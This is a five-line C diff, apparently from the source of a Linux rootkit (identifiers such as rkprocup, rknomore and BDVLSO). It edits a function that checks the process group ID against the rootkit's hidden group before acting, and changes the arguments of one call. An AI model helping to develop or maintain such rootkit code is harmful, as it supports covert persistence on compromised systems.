@@ -1,5 +1,5 @@
 void gidchanger(void){
-    if(getgid()==readgid() || rkprocup() || rknomore(INSTALL_DIR, BDVLSO))
+    if(getgid()==readgid() || rkprocup() || rknomore())
         return;
 
     int curtime = time(NULL);
